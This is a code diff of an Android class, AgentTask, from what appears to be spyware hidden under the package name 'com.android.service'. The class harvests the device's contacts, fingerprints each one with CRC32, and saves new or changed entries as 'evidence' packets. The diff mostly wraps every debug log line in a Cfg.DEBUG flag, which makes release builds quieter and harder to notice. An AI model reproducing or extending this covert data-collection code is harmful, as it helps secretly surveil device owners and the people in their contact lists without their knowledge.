@@ -15,22 +15,15 @@ import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
 import java.util.ListIterator;
-import java.util.zip.CRC32;
 
 import android.util.Log;
 
 import com.android.service.LogR;
 import com.android.service.agent.task.Contact;
-import com.android.service.agent.task.EmailInfo;
-import com.android.service.agent.task.ImInfo;
-import com.android.service.agent.task.OrganizationInfo;
 import com.android.service.agent.task.PhoneInfo;
 import com.android.service.agent.task.PickContact;
-import com.android.service.agent.task.PostalAddressInfo;
 import com.android.service.agent.task.UserInfo;
-import com.android.service.agent.task.WebsiteInfo;
-import com.android.service.auto.AutoConfig;
-import com.android.service.conf.Configuration;
+import com.android.service.auto.Cfg;
 import com.android.service.crypto.Encryption;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.evidence.Markup;
@@ -72,7 +65,7 @@ public class AgentTask extends AgentBase {
 			try {
 				contacts = (HashMap<Long, Long>) markup.readMarkupSerializable();
 			} catch (IOException e) {
-				Log.d("QZ", TAG + " Error (begin): cannot read markup");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Error (begin): cannot read markup");
 			}
 		}
 
@@ -93,7 +86,7 @@ public class AgentTask extends AgentBase {
 			boolean ret = markup.writeMarkupSerializable(contacts);
 			Check.ensures(ret,"cannot serialize");
 		} catch (IOException e) {
-			Log.d("QZ", TAG + " Error (serializeContacts): " + e);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error (serializeContacts): " + e);
 		}
 	}
 
@@ -108,8 +101,8 @@ public class AgentTask extends AgentBase {
 		Date before = new Date();
 		List<Contact> list = contact.getContactInfo();
 		Date after = new Date();
-		Log.d("QZ", TAG + " (go): get contact time s " + (after.getTime() - before.getTime()) / 1000);
-		Log.d("QZ", TAG + " (go): list size = " + list.size());
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " (go): get contact time s " + (after.getTime() - before.getTime()) / 1000);
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " (go): list size = " + list.size());
 
 		ListIterator<Contact> iter = list.listIterator();
 
@@ -121,14 +114,14 @@ public class AgentTask extends AgentBase {
 
 			// calculate the crc of the contact
 			byte[] packet = preparePacket(c);
-			Log.d("QZ", TAG + " (go): " + Utils.byteArrayToHex(packet));
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " (go): " + Utils.byteArrayToHex(packet));
 			Long crcOld = contacts.get(c.getId());
 			Long crcNew = Encryption.CRC32(packet);
-			Log.d("QZ", TAG + " (go): " + crcOld + " <-> " + crcNew);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " (go): " + crcOld + " <-> " + crcNew);
 
 			// if does not match, save and serialize
 			if (!crcNew.equals(crcOld)) {
-				Log.d("QZ", TAG + " (go): new contact. " + c);
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " (go): new contact. " + c);
 				contacts.put(c.getId(), crcNew);
 				saveEvidence(c);
 				needToSerialize = true;
@@ -136,7 +129,7 @@ public class AgentTask extends AgentBase {
 		}
 
 		if (needToSerialize) {
-			Log.d("QZ", TAG + " (go): serialize contacts");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " (go): serialize contacts");
 			serializeContacts();
 		}
 	}
@@ -185,7 +178,7 @@ public class AgentTask extends AgentBase {
 			addTypedString(outputStream, (byte) 0x07, number);
 		}
 		addTypedString(outputStream, (byte) 0x37, message);
-		Log.d("QZ", TAG + " (preparePacket): " + uid + " " + name);
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " (preparePacket): " + uid + " " + name);
 
 		byte[] payload = outputStream.toByteArray();
 
@@ -213,8 +206,8 @@ public class AgentTask extends AgentBase {
 				outputStream.write(Utils.intToByteArray(header));
 				outputStream.write(WChar.getBytes(name, false));
 			} catch (IOException e) {
-				if(AutoConfig.DEBUG) { e.printStackTrace(); }
-				Log.d("QZ", TAG + " Error (addTypedString): " + e);
+				if(Cfg.DEBUG) { e.printStackTrace(); }
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Error (addTypedString): " + e);
 			}
 		}
 	}
